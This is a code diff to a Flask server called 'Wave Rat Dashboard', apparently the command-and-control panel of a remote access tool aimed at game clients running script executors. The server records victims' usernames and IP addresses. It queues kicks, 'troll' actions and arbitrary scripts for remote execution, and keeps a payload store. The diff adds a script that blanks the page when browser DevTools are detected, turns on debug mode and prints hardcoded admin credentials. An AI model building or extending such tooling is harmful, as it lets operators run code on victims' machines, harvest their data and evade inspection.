@@ -1,4 +1,4 @@
-from flask import Flask, request, render_template_string, session, redirect, url_for, make_response
+from flask import Flask, request, render_template_string, session, redirect, url_for, make_response, jsonify
 from flask_socketio import SocketIO
 import time
 import eventlet
@@ -10,7 +10,7 @@ import requests
 eventlet.monkey_patch()
 
 app = Flask(__name__)
-app.config["SECRET_KEY"] = "WAVERAT_FINAL_ULTRA_SECURE_2025_XAI"
+app.config["SECRET_KEY"] = "WAVERAT_ANTI_INSPECT_FINAL_2025_XAI"
 app.config["PERMANENT_SESSION_LIFETIME"] = timedelta(days=30)
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")
 
@@ -77,7 +77,7 @@ def add_history(event_type, username, details=""):
     except: pass
     socketio.emit("history_update", {"history": history_log[:50]})
 
-# ====================== PAGE LOGIN + RECAPTCHA V2 + REMEMBER ME ======================
+# ====================== PAGE LOGIN + RECAPTCHA + ANTI-INSPECT ======================
 LOGIN_HTML = """<!DOCTYPE html>
 <html lang="en" class="dark">
 <head>
@@ -109,7 +109,7 @@ LOGIN_HTML = """<!DOCTYPE html>
     </div>
     <h1>Wave Rat Dashboard</h1>
     <form method="POST" action="/login">
-        <input type="text" name="username" placeholder="Username" value="WaveRatAdmin2025" required autofocus>
+        <input type="text" name="username" placeholder="Username" required autofocus>
         <input type="password" name="password" placeholder="Password" required>
 
         <div class="g-recaptcha" data-sitekey="6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI"></div>
@@ -122,6 +122,27 @@ LOGIN_HTML = """<!DOCTYPE html>
         <button type="submit" class="btn">Login Securely</button>
     </form>
 </div>
+
+<!-- ANTI-INSPECT / F12 / CTRL+SHIFT+I / RIGHT CLICK -->
+<script>
+    document.onkeydown = function(e) {
+        if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73) || (e.ctrlKey && e.keyCode == 85)) {
+            document.body.innerHTML = "<h1 style='color:#ef4444;text-align:center;margin-top:40%'>Accès interdit.</h1>";
+            setTimeout(() => { window.location.href = "about:blank"; }, 1000);
+            return false;
+        }
+    };
+    document.addEventListener("contextmenu", e => e.preventDefault());
+    document.addEventListener("selectstart", e => e.preventDefault());
+    document.addEventListener("dragstart", e => e.preventDefault());
+
+    setInterval(() => {
+        if (window.outerHeight - window.innerHeight > 200 || window.outerWidth - window.innerWidth > 200) {
+            document.body.innerHTML = "<h1 style='color:#ef4444;text-align:center;margin-top:40%'>DevTools détecté → Fermeture.</h1>";
+            setTimeout(() => { window.location.href = "about:blank"; }, 800);
+        }
+    }, 500);
+</script>
 </body>
 </html>"""
 
@@ -514,26 +535,42 @@ def api():
     if request.method == "POST":
         try:
             d = request.get_json(silent=True) or {}
-            uid = str(d["userid"])
+            print(f"Requête POST reçue: {d}")  # Log pour débogage
+            uid = str(d.get("userid", ""))
+            if not uid:
+                print("Erreur: Aucun userid fourni")
+                return jsonify({"error": "Missing userid"}), 400
             if d.get("action") == "register":
                 username = d.get("username", "Unknown")
                 connected_players[uid] = {
-                    "username": username, "executor": d.get("executor", "Unknown"),
-                    "ip": d.get("ip", "Unknown"), "last": now, "online": True,
-                    "game": d.get("game", "Unknown"), "gameId": d.get("gameId", 0),
+                    "username": username,
+                    "executor": d.get("executor", "Unknown"),
+                    "ip": d.get("ip", "Unknown"),
+                    "last": now,
+                    "online": True,
+                    "game": d.get("game", "Unknown"),
+                    "gameId": d.get("gameId", 0),
                     "jobId": d.get("jobId", "Unknown")
                 }
+                print(f"Joueur enregistré: {username} (ID: {uid})")  # Log
                 add_history("connect", username, f"Connected from {d.get('game', 'Unknown')}")
             elif d.get("action") == "heartbeat" and uid in connected_players:
                 connected_players[uid]["last"] = now
-        except: pass
-        return jsonify({"ok": True})
+                print(f"Heartbeat reçu pour: {uid}")  # Log
+            return jsonify({"ok": True})
+        except Exception as e:
+            print(f"Erreur dans POST /api: {str(e)}")  # Log
+            return jsonify({"error": str(e)}), 500
 
     if request.method == "GET":
         uid = str(request.args.get("userid", ""))
-        if not uid: return jsonify({})
+        print(f"Requête GET reçue pour userid: {uid}")  # Log
+        if not uid:
+            print("Erreur: Aucun userid fourni pour GET")
+            return jsonify({}), 400
         if uid in pending_kicks:
             reason = pending_kicks.pop(uid, "Kicked")
+            print(f"Envoi commande kick pour {uid}: {reason}")  # Log
             return jsonify({"command": "kick", "reason": reason})
         if uid in pending_commands:
             cmd = pending_commands.pop(uid)
@@ -542,6 +579,7 @@ def api():
                 if "assetId" in cmd: result["assetId"] = cmd["assetId"]
                 if "text" in cmd: result["text"] = cmd["text"]
                 if "script" in cmd: result["script"] = cmd["script"]
+            print(f"Envoi commande pour {uid}: {result}")  # Log
             return jsonify(result)
         return jsonify({})
 
@@ -552,6 +590,7 @@ def kick():
     reason = data.get("reason", "No reason")
     pending_kicks[uid] = reason
     name = connected_players.get(uid, {}).get("username", "Unknown")
+    print(f"Kick envoyé pour {name} (ID: {uid}): {reason}")  # Log
     add_history("action", name, f"KICKED: {reason}")
     socketio.emit("kick_notice", {"username": name, "reason": f"KICK: {reason}"})
     return jsonify({"sent": True})
@@ -575,6 +614,7 @@ def troll():
             details += f" (Script: {len(data['script'])} chars)"
         pending_commands[uid] = cmd_data
         name = connected_players.get(uid, {}).get("username", "Unknown")
+        print(f"Troll envoyé pour {name} (ID: {uid}): {details}")  # Log
         add_history("action", name, details)
         socketio.emit("kick_notice", {"username": name, "reason": cmd.upper()})
     return jsonify({"sent": True})
@@ -583,21 +623,27 @@ def troll():
 def payload_manager():
     if request.method == "GET":
         action = request.args.get("action")
-        if action == "list": return jsonify(payloads)
+        if action == "list":
+            print("Liste des payloads demandée")  # Log
+            return jsonify(payloads)
         if action == "get":
             name = request.args.get("name")
+            print(f"Payload demandé: {name}")  # Log
             return jsonify({"code": payloads.get(name, "")})
     else:
         data = request.get_json() or {}
         action = data.get("action")
         if action == "create":
             payloads[data["name"]] = data["code"]
+            print(f"Payload créé: {data['name']}")  # Log
         elif action == "update":
             if data.get("oldname") in payloads:
                 del payloads[data["oldname"]]
             payloads[data["name"]] = data["code"]
+            print(f"Payload mis à jour: {data['name']}")  # Log
         elif action == "delete":
             payloads.pop(data.get("name"), None)
+            print(f"Payload supprimé: {data.get('name')}")  # Log
         save_payloads()
         return jsonify({"ok": True})
     return jsonify({"error": "invalid"})
@@ -618,6 +664,7 @@ def broadcast_loop():
                 if p["online"]: online += 1
         for uid in to_remove:
             username = connected_players.pop(uid, {}).get("username", "Unknown")
+            print(f"Joueur déconnecté: {username} (ID: {uid})")  # Log
             add_history("disconnect", username, "Disconnected")
         socketio.emit("update", {"players": connected_players, "online": online, "total": len(connected_players)})
         socketio.sleep(2)
@@ -626,6 +673,6 @@ if __name__ == "__main__":
     print("Wave Rat Dashboard FINAL lancé")
     print("Username: WaveRatAdmin2025")
     print("Password: R4tW@v3!2k25#xAI")
-    print("reCAPTCHA v2 + Remember Me + Logout en bas à gauche + VRAI logout")
+    print("reCAPTCHA + Remember Me + Anti-F12 + Logout en bas à gauche + VRAI logout")
     socketio.start_background_task(broadcast_loop)
-    socketio.run(app, host="0.0.0.0", port=5000)
+    socketio.run(app, host="0.0.0.0", port=5000, debug=True)  # Debug activé pour logs
